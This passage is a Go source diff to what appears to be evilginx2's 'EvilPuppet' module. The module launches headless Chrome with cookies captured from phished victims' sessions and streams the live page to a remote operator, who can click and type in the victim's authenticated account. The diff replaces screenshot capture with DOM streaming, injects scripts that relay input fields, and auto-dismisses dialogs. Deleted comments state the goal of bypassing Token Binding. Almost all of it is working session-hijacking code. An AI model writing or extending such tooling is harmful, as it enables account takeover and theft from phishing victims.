@@ -2,7 +2,9 @@ package core
 
 import (
 	"context"
+	"encoding/json"
 	"fmt"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -11,6 +13,7 @@ import (
 	"github.com/chromedp/cdproto/input"
 	"github.com/chromedp/cdproto/network"
 	"github.com/chromedp/cdproto/page"
+	"github.com/chromedp/cdproto/runtime"
 	"github.com/chromedp/chromedp"
 
 	"github.com/kgretzky/evilginx2/database"
@@ -41,8 +44,20 @@ func (s PuppetStatus) String() string {
 	}
 }
 
+// DOMUpdate represents a DOM content or input-change update sent to WebSocket clients.
+type DOMUpdate struct {
+	Type           string `json:"type"`                     // "domupdate", "inputchange", or "url"
+	Head           string `json:"head,omitempty"`            // outerHTML of <head>
+	Body           string `json:"body,omitempty"`            // outerHTML of <body>
+	URL            string `json:"url,omitempty"`             // current page URL
+	CSSPath        string `json:"cssPath,omitempty"`         // CSS selector (for inputchange)
+	Value          string `json:"value,omitempty"`           // input value (for inputchange)
+	SelectionStart int    `json:"selectionStart,omitempty"`  // cursor start (for inputchange)
+	SelectionEnd   int    `json:"selectionEnd,omitempty"`    // cursor end (for inputchange)
+}
+
 // PuppetInstance represents a single headless Chrome browser session
-// that is remotely controlled via the EvilPuppet interface.
+// controlled via the EvilPuppet DOM-streaming interface.
 type PuppetInstance struct {
 	Id         int
 	SessionId  int
@@ -58,10 +73,13 @@ type PuppetInstance struct {
 	allocCtx    context.Context
 	allocCancel context.CancelFunc
 
-	mu         sync.Mutex
-	lastScreen []byte
-	screenCh   chan []byte
-	stopCh     chan struct{}
+	mu            sync.Mutex
+	contentCh     chan *DOMUpdate   // DOM updates for WebSocket streaming
+	stopCh        chan struct{}
+	resourceCache *ResourceCache
+	lastUpdate    *DOMUpdate       // most recent full DOM state for new clients
+	oldHead       string           // for change detection
+	oldBody       string
 
 	viewportW int
 	viewportH int
@@ -69,23 +87,24 @@ type PuppetInstance struct {
 
 // PuppetInput represents an input event forwarded from the web UI to the puppet browser.
 type PuppetInput struct {
-	Type      string  `json:"type"`
-	X         float64 `json:"x,omitempty"`
-	Y         float64 `json:"y,omitempty"`
-	Button    string  `json:"button,omitempty"`
-	Text      string  `json:"text,omitempty"`
-	Key       string  `json:"key,omitempty"`
-	Code      string  `json:"code,omitempty"`
-	DeltaX    float64 `json:"deltaX,omitempty"`
-	DeltaY    float64 `json:"deltaY,omitempty"`
-	URL       string  `json:"url,omitempty"`
-	Modifiers int     `json:"modifiers,omitempty"`
+	Type           string  `json:"type"`
+	X              float64 `json:"x,omitempty"`
+	Y              float64 `json:"y,omitempty"`
+	Button         string  `json:"button,omitempty"`
+	Text           string  `json:"text,omitempty"`
+	Key            string  `json:"key,omitempty"`
+	Code           string  `json:"code,omitempty"`
+	DeltaX         float64 `json:"deltaX,omitempty"`
+	DeltaY         float64 `json:"deltaY,omitempty"`
+	URL            string  `json:"url,omitempty"`
+	Modifiers      int     `json:"modifiers,omitempty"`
+	CSSPath        string  `json:"cssPath,omitempty"`
+	Value          string  `json:"value,omitempty"`
+	SelectionStart int     `json:"selectionStart,omitempty"`
+	SelectionEnd   int     `json:"selectionEnd,omitempty"`
 }
 
 // PuppetManager manages all puppet browser instances.
-// It provides the core EvilPuppet functionality: launching headless browsers
-// with captured session cookies, enabling remote control of authenticated sessions
-// to bypass Token Protection (Token Binding).
 type PuppetManager struct {
 	instances  map[int]*PuppetInstance
 	nextId     int
@@ -137,7 +156,6 @@ func (pm *PuppetManager) SetPassword(password string) {
 
 // LaunchPuppet creates a new headless Chrome instance, injects the captured cookies
 // from the specified session, and navigates to the target URL.
-// This keeps the session alive on the server, bypassing Token Binding.
 func (pm *PuppetManager) LaunchPuppet(sessionId int, targetURL string) (*PuppetInstance, error) {
 	sessions, err := pm.db.ListSessions()
 	if err != nil {
@@ -169,17 +187,18 @@ func (pm *PuppetManager) LaunchPuppet(sessionId int, targetURL string) (*PuppetI
 	pm.mu.Unlock()
 
 	puppet := &PuppetInstance{
-		Id:         id,
-		SessionId:  sessionId,
-		Phishlet:   dbSession.Phishlet,
-		Username:   dbSession.Username,
-		TargetURL:  targetURL,
-		Status:     PUPPET_STARTING,
-		CreateTime: time.Now(),
-		screenCh:   make(chan []byte, 5),
-		stopCh:     make(chan struct{}),
-		viewportW:  1920,
-		viewportH:  1080,
+		Id:            id,
+		SessionId:     sessionId,
+		Phishlet:      dbSession.Phishlet,
+		Username:      dbSession.Username,
+		TargetURL:     targetURL,
+		Status:        PUPPET_STARTING,
+		CreateTime:    time.Now(),
+		contentCh:     make(chan *DOMUpdate, 5),
+		stopCh:        make(chan struct{}),
+		resourceCache: NewResourceCache(id),
+		viewportW:     1920,
+		viewportH:     1080,
 	}
 
 	pm.mu.Lock()
@@ -192,7 +211,6 @@ func (pm *PuppetManager) LaunchPuppet(sessionId int, targetURL string) (*PuppetI
 }
 
 func (pm *PuppetManager) runPuppet(puppet *PuppetInstance, dbSession *database.Session) {
-	// Set up Chrome allocator options
 	opts := append(chromedp.DefaultExecAllocatorOptions[:],
 		chromedp.Flag("headless", true),
 		chromedp.Flag("disable-gpu", true),
@@ -226,6 +244,14 @@ func (pm *PuppetManager) runPuppet(puppet *PuppetInstance, dbSession *database.S
 		return
 	}
 
+	// Auto-dismiss JavaScript dialogs
+	chromedp.ListenTarget(ctx, func(ev interface{}) {
+		switch ev.(type) {
+		case *page.EventJavascriptDialogOpening:
+			go chromedp.Run(ctx, page.HandleJavaScriptDialog(true))
+		}
+	})
+
 	// Inject all captured cookies from the session
 	cookieCount := 0
 	for domain, cookies := range dbSession.CookieTokens {
@@ -253,6 +279,9 @@ func (pm *PuppetManager) runPuppet(puppet *PuppetInstance, dbSession *database.S
 	}
 	log.Success("puppet [%d]: injected %d cookies from session %d", puppet.Id, cookieCount, puppet.SessionId)
 
+	// Set up input change listener for real-time text sync
+	SetupInputChangeListener(puppet)
+
 	// Navigate to the target URL
 	log.Info("puppet [%d]: navigating to %s", puppet.Id, puppet.TargetURL)
 	if err := chromedp.Run(ctx, chromedp.Navigate(puppet.TargetURL)); err != nil {
@@ -273,7 +302,6 @@ func (pm *PuppetManager) runPuppet(puppet *PuppetInstance, dbSession *database.S
 
 	log.Success("puppet [%d]: browser running - session %d (%s) -> %s", puppet.Id, puppet.SessionId, puppet.Username, puppet.TargetURL)
 
-	// Build and show the control URL
 	serverIP := pm.cfg.GetServerExternalIP()
 	if serverIP == "" {
 		serverIP = "your-server-ip"
@@ -281,8 +309,8 @@ func (pm *PuppetManager) runPuppet(puppet *PuppetInstance, dbSession *database.S
 	controlURL := fmt.Sprintf("http://%s:%d/puppet/%d?key=%s", serverIP, pm.port, puppet.Id, pm.password)
 	log.Info("puppet [%d]: control URL: %s", puppet.Id, controlURL)
 
-	// Start the screenshot capture loop
-	go pm.screenshotLoop(puppet)
+	// Start the DOM content streaming loop
+	go DomStreamLoop(puppet)
 
 	// Wait for stop signal
 	<-puppet.stopCh
@@ -296,8 +324,54 @@ func (pm *PuppetManager) runPuppet(puppet *PuppetInstance, dbSession *database.S
 	log.Info("puppet [%d]: stopped", puppet.Id)
 }
 
-func (pm *PuppetManager) screenshotLoop(puppet *PuppetInstance) {
-	ticker := time.NewTicker(300 * time.Millisecond) // ~3 fps — balanced for low-resource servers
+// SetupInputChangeListener injects JavaScript into the puppet browser that watches
+// for input field changes and sends them immediately through a binding, providing
+// near-instant text synchronization (like EvilPuppetJS's setupPuppeteerChangeListeners).
+func SetupInputChangeListener(puppet *PuppetInstance) {
+	chromedp.Run(puppet.ctx, chromedp.ActionFunc(func(ctx context.Context) error {
+		// Create a binding that JS can call to notify us of input changes
+		if err := runtime.AddBinding("__puppetInputChanged").Do(ctx); err != nil {
+			return err
+		}
+		// Inject the listener into every new document (survives navigations)
+		_, err := page.AddScriptToEvaluateOnNewDocument(inputListenerScript).Do(ctx)
+		return err
+	}))
+
+	// Listen for binding calls and forward input changes to the client
+	chromedp.ListenTarget(puppet.ctx, func(ev interface{}) {
+		switch e := ev.(type) {
+		case *runtime.EventBindingCalled:
+			if e.Name == "__puppetInputChanged" {
+				var inputData struct {
+					CSSPath        string `json:"cssPath"`
+					Value          string `json:"value"`
+					SelectionStart int    `json:"selectionStart"`
+					SelectionEnd   int    `json:"selectionEnd"`
+				}
+				if err := json.Unmarshal([]byte(e.Payload), &inputData); err != nil {
+					return
+				}
+				update := &DOMUpdate{
+					Type:           "inputchange",
+					CSSPath:        inputData.CSSPath,
+					Value:          inputData.Value,
+					SelectionStart: inputData.SelectionStart,
+					SelectionEnd:   inputData.SelectionEnd,
+				}
+				select {
+				case puppet.contentCh <- update:
+				default:
+				}
+			}
+		}
+	})
+}
+
+// DomStreamLoop continuously extracts the DOM from the puppet browser and sends updates
+// to connected WebSocket clients. This is the core of the EvilPuppet DOM-streaming approach.
+func DomStreamLoop(puppet *PuppetInstance) {
+	ticker := time.NewTicker(300 * time.Millisecond)
 	defer ticker.Stop()
 
 	for {
@@ -313,37 +387,96 @@ func (pm *PuppetManager) screenshotLoop(puppet *PuppetInstance) {
 				continue
 			}
 
-			// Timeout so a slow capture doesn't block input handling
-			screenshotCtx, screenshotCancel := context.WithTimeout(puppet.ctx, 3*time.Second)
-			var buf []byte
-			err := chromedp.Run(screenshotCtx, chromedp.ActionFunc(func(ctx context.Context) error {
-				var err error
-				buf, err = page.CaptureScreenshot().
-					WithFormat(page.CaptureScreenshotFormatJpeg).
-					WithQuality(45).
-					Do(ctx)
-				return err
-			}))
-			screenshotCancel()
+			update, err := ExtractPageDOM(puppet)
 			if err != nil {
 				continue
 			}
 
-			puppet.mu.Lock()
-			puppet.lastScreen = buf
-			puppet.mu.Unlock()
-
-			// Drain stale frame, then send new one
-			select {
-			case <-puppet.screenCh:
-			default:
-			}
-			select {
-			case puppet.screenCh <- buf:
-			default:
+			if update != nil {
+				// Drain any stale DOM update, then send the new one
+				select {
+				case <-puppet.contentCh:
+				default:
+				}
+				select {
+				case puppet.contentCh <- update:
+				default:
+				}
 			}
 		}
 	}
+}
+
+// domExtractionResult is the Go struct matching the JSON returned by the extraction JavaScript.
+type domExtractionResult struct {
+	Head      string   `json:"head"`
+	Body      string   `json:"body"`
+	URL       string   `json:"url"`
+	Resources []string `json:"resources"`
+}
+
+// ExtractPageDOM evaluates JavaScript in the puppet browser to extract the processed page DOM.
+// It strips scripts, rewrites resource URLs to go through the proxy, and syncs input values.
+// Returns nil if nothing has changed since the last extraction.
+func ExtractPageDOM(puppet *PuppetInstance) (*DOMUpdate, error) {
+	script := strings.ReplaceAll(extractDOMScript, "PUPPET_ID_PLACEHOLDER", strconv.Itoa(puppet.Id))
+
+	var resultJSON string
+	evalCtx, evalCancel := context.WithTimeout(puppet.ctx, 5*time.Second)
+	defer evalCancel()
+
+	err := chromedp.Run(evalCtx, chromedp.Evaluate(script, &resultJSON))
+	if err != nil {
+		return nil, err
+	}
+
+	var result domExtractionResult
+	if err := json.Unmarshal([]byte(resultJSON), &result); err != nil {
+		return nil, err
+	}
+
+	// Check for changes
+	puppet.mu.Lock()
+	headChanged := puppet.oldHead != result.Head
+	bodyChanged := puppet.oldBody != result.Body
+	puppet.oldHead = result.Head
+	puppet.oldBody = result.Body
+	puppet.mu.Unlock()
+
+	if !headChanged && !bodyChanged {
+		return nil, nil
+	}
+
+	update := &DOMUpdate{
+		Type: "domupdate",
+		URL:  result.URL,
+	}
+	if headChanged {
+		update.Head = result.Head
+	}
+	if bodyChanged {
+		update.Body = result.Body
+	}
+
+	// Store full state for newly connecting clients
+	puppet.mu.Lock()
+	puppet.lastUpdate = &DOMUpdate{
+		Type: "domupdate",
+		Head: result.Head,
+		Body: result.Body,
+		URL:  result.URL,
+	}
+	puppet.mu.Unlock()
+
+	// Background-fetch and cache referenced resources
+	if puppet.resourceCache != nil {
+		for _, resURL := range result.Resources {
+			resURL := resURL
+			go puppet.resourceCache.FetchAndCache(resURL)
+		}
+	}
+
+	return update, nil
 }
 
 // HandleInput dispatches an input event to the puppet's headless Chrome instance.
@@ -366,21 +499,19 @@ func (pm *PuppetManager) HandleInput(puppetId int, pi PuppetInput) error {
 
 	switch pi.Type {
 	case "click":
-		return pm.handleMouseClick(puppet, pi)
-	case "mousedown":
-		return pm.handleMouseDown(puppet, pi)
-	case "mouseup":
-		return pm.handleMouseUp(puppet, pi)
-	case "mousemove":
-		return pm.handleMouseMove(puppet, pi)
+		return pm.handleCSSClick(puppet, pi)
 	case "type":
 		return pm.handleType(puppet, pi)
+	case "keypress":
+		return pm.handleKeyPress(puppet, pi)
 	case "keydown":
 		return pm.handleKeyDown(puppet, pi)
 	case "keyup":
 		return pm.handleKeyUp(puppet, pi)
 	case "scroll":
 		return pm.handleScroll(puppet, pi)
+	case "selectionchange":
+		return pm.handleSelectionChange(puppet, pi)
 	case "navigate":
 		return pm.handleNavigate(puppet, pi)
 	case "back":
@@ -393,122 +524,92 @@ func (pm *PuppetManager) HandleInput(puppetId int, pi PuppetInput) error {
 	return nil
 }
 
-func (pm *PuppetManager) handleMouseClick(puppet *PuppetInstance, pi PuppetInput) error {
-	btn := input.Left
-	if pi.Button == "right" {
-		btn = input.Right
-	} else if pi.Button == "middle" {
-		btn = input.Middle
+// handleCSSClick clicks an element in the puppet browser identified by its CSS selector path.
+func (pm *PuppetManager) handleCSSClick(puppet *PuppetInstance, pi PuppetInput) error {
+	if pi.CSSPath == "" {
+		return nil
 	}
-
-	err := chromedp.Run(puppet.ctx,
-		chromedp.ActionFunc(func(ctx context.Context) error {
-			// Move to the target position first to trigger hover/focus states
-			if err := input.DispatchMouseEvent(input.MouseMoved, pi.X, pi.Y).
-				Do(ctx); err != nil {
-				return err
-			}
-			time.Sleep(30 * time.Millisecond)
-
-			if err := input.DispatchMouseEvent(input.MousePressed, pi.X, pi.Y).
-				WithButton(btn).
-				WithClickCount(1).
-				WithModifiers(input.Modifier(pi.Modifiers)).
-				Do(ctx); err != nil {
-				return err
-			}
-			time.Sleep(40 * time.Millisecond)
-
-			return input.DispatchMouseEvent(input.MouseReleased, pi.X, pi.Y).
-				WithButton(btn).
-				WithClickCount(1).
-				WithModifiers(input.Modifier(pi.Modifiers)).
-				Do(ctx)
-		}),
-	)
-	if err != nil {
-		return err
-	}
-
-	// JavaScript fallback: find the element at click coordinates and focus/click it.
-	// This handles custom input components (like Microsoft's login) where CDP mouse
-	// events hit an overlay div instead of the actual <input> underneath.
+	cssPathJSON, _ := json.Marshal(pi.CSSPath)
 	var ignored interface{}
-	_ = chromedp.Run(puppet.ctx, chromedp.Evaluate(fmt.Sprintf(`
-		(function() {
-			var el = document.elementFromPoint(%f, %f);
-			if (!el) return;
-			var target = null;
-			// Check if el itself is an input
-			if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.isContentEditable) {
-				target = el;
+	return chromedp.Run(puppet.ctx, chromedp.Evaluate(fmt.Sprintf(`
+		(function(path) {
+			var el = document.querySelector(path);
+			if (!el) return false;
+			el.click();
+			if (el.focus) el.focus();
+			if ((el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') && el.value !== undefined) {
+				el.selectionStart = el.selectionEnd = el.value.length;
 			}
-			// Search inside the clicked element for an input
-			if (!target) {
-				target = el.querySelector('input, textarea, [contenteditable="true"]');
-			}
-			// Walk up the DOM — check parent and grandparent for inputs
-			if (!target) {
-				var parent = el.parentElement;
-				for (var i = 0; i < 5 && parent; i++) {
-					target = parent.querySelector('input, textarea, [contenteditable="true"]');
-					if (target) break;
-					parent = parent.parentElement;
-				}
-			}
-			if (target) {
-				target.focus();
-				target.click();
-				// Set cursor to end of any existing value
-				if (target.value !== undefined) {
-					target.selectionStart = target.selectionEnd = target.value.length;
-				}
-			} else {
-				el.click();
-				if (el.focus) el.focus();
-			}
-		})()
-	`, pi.X, pi.Y), &ignored))
-
-	return nil
+			return true;
+		})(%s)
+	`, string(cssPathJSON)), &ignored))
 }
 
-func (pm *PuppetManager) handleMouseDown(puppet *PuppetInstance, pi PuppetInput) error {
-	btn := input.Left
-	if pi.Button == "right" {
-		btn = input.Right
+// handleKeyPress handles a key press event (EvilPuppetJS-style: single press = down+char+up).
+func (pm *PuppetManager) handleKeyPress(puppet *PuppetInstance, pi PuppetInput) error {
+	keyName := pi.Key
+	if keyName == "" {
+		keyName = pi.Text
 	}
-	return chromedp.Run(puppet.ctx,
-		chromedp.ActionFunc(func(ctx context.Context) error {
-			return input.DispatchMouseEvent(input.MousePressed, pi.X, pi.Y).
-				WithButton(btn).
-				WithClickCount(1).
-				Do(ctx)
-		}),
-	)
-}
-
-func (pm *PuppetManager) handleMouseUp(puppet *PuppetInstance, pi PuppetInput) error {
-	btn := input.Left
-	if pi.Button == "right" {
-		btn = input.Right
+	if keyName == "" {
+		return nil
 	}
-	return chromedp.Run(puppet.ctx,
-		chromedp.ActionFunc(func(ctx context.Context) error {
-			return input.DispatchMouseEvent(input.MouseReleased, pi.X, pi.Y).
-				WithButton(btn).
-				WithClickCount(1).
-				Do(ctx)
-		}),
-	)
-}
 
-func (pm *PuppetManager) handleMouseMove(puppet *PuppetInstance, pi PuppetInput) error {
-	return chromedp.Run(puppet.ctx,
-		chromedp.ActionFunc(func(ctx context.Context) error {
-			return input.DispatchMouseEvent(input.MouseMoved, pi.X, pi.Y).Do(ctx)
-		}),
-	)
+	switch keyName {
+	case "CtrlBackspace":
+		return chromedp.Run(puppet.ctx, chromedp.ActionFunc(func(ctx context.Context) error {
+			input.DispatchKeyEvent(input.KeyDown).WithKey("Control").WithCode("ControlLeft").WithWindowsVirtualKeyCode(17).WithNativeVirtualKeyCode(17).Do(ctx)
+			input.DispatchKeyEvent(input.KeyDown).WithKey("Backspace").WithCode("Backspace").WithWindowsVirtualKeyCode(8).WithNativeVirtualKeyCode(8).Do(ctx)
+			input.DispatchKeyEvent(input.KeyUp).WithKey("Backspace").WithCode("Backspace").Do(ctx)
+			input.DispatchKeyEvent(input.KeyUp).WithKey("Control").WithCode("ControlLeft").Do(ctx)
+			return nil
+		}))
+	case "CtrlZ":
+		return chromedp.Run(puppet.ctx, chromedp.ActionFunc(func(ctx context.Context) error {
+			input.DispatchKeyEvent(input.KeyDown).WithKey("Control").WithCode("ControlLeft").WithWindowsVirtualKeyCode(17).WithNativeVirtualKeyCode(17).Do(ctx)
+			input.DispatchKeyEvent(input.KeyDown).WithKey("z").WithCode("KeyZ").Do(ctx)
+			input.DispatchKeyEvent(input.KeyUp).WithKey("z").WithCode("KeyZ").Do(ctx)
+			input.DispatchKeyEvent(input.KeyUp).WithKey("Control").WithCode("ControlLeft").Do(ctx)
+			return nil
+		}))
+	case "CtrlY":
+		return chromedp.Run(puppet.ctx, chromedp.ActionFunc(func(ctx context.Context) error {
+			input.DispatchKeyEvent(input.KeyDown).WithKey("Control").WithCode("ControlLeft").WithWindowsVirtualKeyCode(17).WithNativeVirtualKeyCode(17).Do(ctx)
+			input.DispatchKeyEvent(input.KeyDown).WithKey("y").WithCode("KeyY").Do(ctx)
+			input.DispatchKeyEvent(input.KeyUp).WithKey("y").WithCode("KeyY").Do(ctx)
+			input.DispatchKeyEvent(input.KeyUp).WithKey("Control").WithCode("ControlLeft").Do(ctx)
+			return nil
+		}))
+	default:
+		return chromedp.Run(puppet.ctx, chromedp.ActionFunc(func(ctx context.Context) error {
+			if len(keyName) == 1 {
+				// Printable character — use KeyChar for reliable input
+				return input.DispatchKeyEvent(input.KeyChar).WithText(keyName).Do(ctx)
+			}
+			// Special key — dispatch KeyDown then KeyUp with modifiers
+			evtDown := input.DispatchKeyEvent(input.KeyDown).WithKey(keyName)
+			if pi.Code != "" {
+				evtDown = evtDown.WithCode(pi.Code)
+			}
+			if pi.Modifiers != 0 {
+				evtDown = evtDown.WithModifiers(input.Modifier(pi.Modifiers))
+			}
+			if vk, ok := keyToVirtualKeyCode(keyName); ok {
+				evtDown = evtDown.WithWindowsVirtualKeyCode(vk).WithNativeVirtualKeyCode(vk)
+			}
+			if err := evtDown.Do(ctx); err != nil {
+				return err
+			}
+			evtUp := input.DispatchKeyEvent(input.KeyUp).WithKey(keyName)
+			if pi.Code != "" {
+				evtUp = evtUp.WithCode(pi.Code)
+			}
+			if pi.Modifiers != 0 {
+				evtUp = evtUp.WithModifiers(input.Modifier(pi.Modifiers))
+			}
+			return evtUp.Do(ctx)
+		}))
+	}
 }
 
 func (pm *PuppetManager) handleType(puppet *PuppetInstance, pi PuppetInput) error {
@@ -535,7 +636,6 @@ func (pm *PuppetManager) handleKeyDown(puppet *PuppetInstance, pi PuppetInput) e
 				WithCode(pi.Code).
 				WithModifiers(input.Modifier(pi.Modifiers))
 
-			// Map common keys to Windows virtual key codes for better compatibility
 			if vk, ok := keyToVirtualKeyCode(pi.Key); ok {
 				evt = evt.WithWindowsVirtualKeyCode(vk).WithNativeVirtualKeyCode(vk)
 			}
@@ -571,6 +671,24 @@ func (pm *PuppetManager) handleScroll(puppet *PuppetInstance, pi PuppetInput) er
 	)
 }
 
+// handleSelectionChange updates the text selection/cursor position in an input element.
+func (pm *PuppetManager) handleSelectionChange(puppet *PuppetInstance, pi PuppetInput) error {
+	if pi.CSSPath == "" {
+		return nil
+	}
+	cssPathJSON, _ := json.Marshal(pi.CSSPath)
+	var ignored interface{}
+	return chromedp.Run(puppet.ctx, chromedp.Evaluate(fmt.Sprintf(`
+		(function(path, start, end) {
+			var el = document.querySelector(path);
+			if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA')) {
+				el.selectionStart = start;
+				el.selectionEnd = end;
+			}
+		})(%s, %d, %d)
+	`, string(cssPathJSON), pi.SelectionStart, pi.SelectionEnd), &ignored))
+}
+
 func (pm *PuppetManager) handleNavigate(puppet *PuppetInstance, pi PuppetInput) error {
 	targetURL := pi.URL
 	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
@@ -592,31 +710,43 @@ func (pm *PuppetManager) handleRefresh(puppet *PuppetInstance) error {
 	return chromedp.Run(puppet.ctx, chromedp.Reload())
 }
 
-// GetScreenshot returns the most recent screenshot for the given puppet.
-func (pm *PuppetManager) GetScreenshot(puppetId int) ([]byte, error) {
+// GetContentChan returns the DOM content channel for live streaming.
+func (pm *PuppetManager) GetContentChan(puppetId int) (chan *DOMUpdate, error) {
 	pm.mu.RLock()
 	puppet, ok := pm.instances[puppetId]
 	pm.mu.RUnlock()
 
 	if !ok {
 		return nil, fmt.Errorf("puppet %d not found", puppetId)
+	}
+	return puppet.contentCh, nil
+}
+
+// GetResourceCache returns the resource cache for a puppet.
+func (pm *PuppetManager) GetResourceCache(puppetId int) (*ResourceCache, error) {
+	pm.mu.RLock()
+	puppet, ok := pm.instances[puppetId]
+	pm.mu.RUnlock()
+
+	if !ok {
+		return nil, fmt.Errorf("puppet %d not found", puppetId)
+	}
+	return puppet.resourceCache, nil
+}
+
+// GetLastUpdate returns the most recent full DOM state for initial client connection.
+func (pm *PuppetManager) GetLastUpdate(puppetId int) *DOMUpdate {
+	pm.mu.RLock()
+	puppet, ok := pm.instances[puppetId]
+	pm.mu.RUnlock()
+
+	if !ok {
+		return nil
 	}
 
 	puppet.mu.Lock()
 	defer puppet.mu.Unlock()
-	return puppet.lastScreen, nil
-}
-
-// GetScreenChan returns the screenshot channel for live streaming.
-func (pm *PuppetManager) GetScreenChan(puppetId int) (chan []byte, error) {
-	pm.mu.RLock()
-	puppet, ok := pm.instances[puppetId]
-	pm.mu.RUnlock()
-
-	if !ok {
-		return nil, fmt.Errorf("puppet %d not found", puppetId)
-	}
-	return puppet.screenCh, nil
+	return puppet.lastUpdate
 }
 
 // GetCurrentURL retrieves the browser's current URL.
@@ -665,7 +795,6 @@ func (pm *PuppetManager) KillPuppet(puppetId int) error {
 
 	select {
 	case <-puppet.stopCh:
-		// Already closed
 	default:
 		close(puppet.stopCh)
 	}
@@ -720,7 +849,7 @@ func (pm *PuppetManager) GetControlURL(puppetId int) string {
 	return fmt.Sprintf("http://%s:%d/puppet/%d?key=%s", serverIP, pm.port, puppetId, pm.password)
 }
 
-// GetDashboardURL returns the URL for the puppet dashboard (list of all puppets).
+// GetDashboardURL returns the URL for the puppet dashboard.
 func (pm *PuppetManager) GetDashboardURL() string {
 	serverIP := pm.cfg.GetServerExternalIP()
 	if serverIP == "" {
@@ -767,3 +896,205 @@ func keyToVirtualKeyCode(key string) (int64, bool) {
 	vk, ok := keyMap[key]
 	return vk, ok
 }
+
+// extractDOMScript is the JavaScript evaluated in the puppet browser to extract the page DOM.
+// It clones the document, strips scripts, rewrites resource URLs to go through the proxy,
+// syncs input values, and returns the processed head/body HTML + resource list.
+// PUPPET_ID_PLACEHOLDER is replaced with the actual puppet ID before evaluation.
+const extractDOMScript = `(function() {
+    var puppetId = PUPPET_ID_PLACEHOLDER;
+    var resBase = '/puppet/res/' + puppetId + '/?url=';
+
+    function proxyURL(rawURL) {
+        if (!rawURL) return rawURL;
+        if (rawURL.startsWith('data:') || rawURL.startsWith('blob:') || rawURL.startsWith('javascript:') || rawURL.startsWith('#')) return rawURL;
+        if (rawURL.indexOf(resBase) === 0) return rawURL;
+        try {
+            var absoluteURL = new URL(rawURL, document.baseURI).href;
+            return resBase + encodeURIComponent(absoluteURL);
+        } catch(e) {
+            return rawURL;
+        }
+    }
+
+    function processCSSText(css) {
+        if (!css || css.indexOf('url(') === -1) return css;
+        return css.replace(/url\(\s*(['"]?)([^'")\s]+)\1\s*\)/g, function(match, quote, url) {
+            if (url.startsWith('data:') || url.startsWith('blob:')) return match;
+            return 'url(' + quote + proxyURL(url) + quote + ')';
+        });
+    }
+
+    var resources = [];
+    var clone = document.documentElement.cloneNode(true);
+
+    // Remove scripts and noscripts
+    var scripts = clone.querySelectorAll('script, noscript');
+    for (var i = scripts.length - 1; i >= 0; i--) scripts[i].parentNode.removeChild(scripts[i]);
+
+    // Remove base tags to prevent URL resolution issues on the client
+    var bases = clone.querySelectorAll('base');
+    for (var i = bases.length - 1; i >= 0; i--) bases[i].parentNode.removeChild(bases[i]);
+
+    // Process link[href] - stylesheets, icons, etc.
+    var links = clone.querySelectorAll('link[href]');
+    for (var i = 0; i < links.length; i++) {
+        var href = links[i].getAttribute('href');
+        if (href) {
+            try {
+                resources.push(new URL(href, document.baseURI).href);
+                links[i].setAttribute('href', proxyURL(href));
+            } catch(e) {}
+        }
+    }
+
+    // Process img[src]
+    var imgs = clone.querySelectorAll('img[src]');
+    for (var i = 0; i < imgs.length; i++) {
+        var src = imgs[i].getAttribute('src');
+        if (src && !src.startsWith('data:')) {
+            try {
+                resources.push(new URL(src, document.baseURI).href);
+                imgs[i].setAttribute('src', proxyURL(src));
+            } catch(e) {}
+        }
+    }
+
+    // Process img[srcset]
+    var imgsSrcset = clone.querySelectorAll('img[srcset]');
+    for (var i = 0; i < imgsSrcset.length; i++) {
+        var srcset = imgsSrcset[i].getAttribute('srcset');
+        if (srcset) {
+            var newSrcset = srcset.replace(/(\S+)(\s+\S+)?/g, function(m, url, descriptor) {
+                return proxyURL(url) + (descriptor || '');
+            });
+            imgsSrcset[i].setAttribute('srcset', newSrcset);
+        }
+    }
+
+    // Process source[src] and source[srcset]
+    var sources = clone.querySelectorAll('source[src], source[srcset]');
+    for (var i = 0; i < sources.length; i++) {
+        var src = sources[i].getAttribute('src');
+        if (src) {
+            try {
+                resources.push(new URL(src, document.baseURI).href);
+                sources[i].setAttribute('src', proxyURL(src));
+            } catch(e) {}
+        }
+        var srcset = sources[i].getAttribute('srcset');
+        if (srcset) {
+            sources[i].setAttribute('srcset', proxyURL(srcset));
+        }
+    }
+
+    // Process inline styles containing url()
+    var styled = clone.querySelectorAll('[style]');
+    for (var i = 0; i < styled.length; i++) {
+        var style = styled[i].getAttribute('style');
+        if (style && style.indexOf('url(') !== -1) {
+            styled[i].setAttribute('style', processCSSText(style));
+        }
+    }
+
+    // Process <style> tag contents
+    var styleTags = clone.querySelectorAll('style');
+    for (var i = 0; i < styleTags.length; i++) {
+        var css = styleTags[i].textContent;
+        if (css && css.indexOf('url(') !== -1) {
+            styleTags[i].textContent = processCSSText(css);
+        }
+    }
+
+    // Process background attributes
+    var bgEls = clone.querySelectorAll('[background]');
+    for (var i = 0; i < bgEls.length; i++) {
+        var bg = bgEls[i].getAttribute('background');
+        if (bg) bgEls[i].setAttribute('background', proxyURL(bg));
+    }
+
+    // Process [poster] attributes (video elements)
+    var posterEls = clone.querySelectorAll('[poster]');
+    for (var i = 0; i < posterEls.length; i++) {
+        var poster = posterEls[i].getAttribute('poster');
+        if (poster) posterEls[i].setAttribute('poster', proxyURL(poster));
+    }
+
+    // Sync input values from the live page to the clone
+    var realInputs = document.querySelectorAll('input, textarea, select');
+    var cloneInputs = clone.querySelectorAll('input, textarea, select');
+    for (var i = 0; i < realInputs.length && i < cloneInputs.length; i++) {
+        if (realInputs[i].tagName === 'SELECT') {
+            var opts = cloneInputs[i].querySelectorAll('option');
+            for (var j = 0; j < opts.length; j++) {
+                if (opts[j].value === realInputs[i].value) {
+                    opts[j].setAttribute('selected', 'selected');
+                } else {
+                    opts[j].removeAttribute('selected');
+                }
+            }
+        } else if (realInputs[i].type === 'checkbox' || realInputs[i].type === 'radio') {
+            if (realInputs[i].checked) {
+                cloneInputs[i].setAttribute('checked', 'checked');
+            } else {
+                cloneInputs[i].removeAttribute('checked');
+            }
+        } else {
+            cloneInputs[i].setAttribute('value', realInputs[i].value || '');
+        }
+    }
+
+    var headEl = clone.querySelector('head');
+    var bodyEl = clone.querySelector('body');
+
+    return JSON.stringify({
+        head: headEl ? headEl.outerHTML : '<head></head>',
+        body: bodyEl ? bodyEl.outerHTML : '<body></body>',
+        url: window.location.href,
+        resources: resources
+    });
+})()`
+
+// inputListenerScript is injected into every document in the puppet browser.
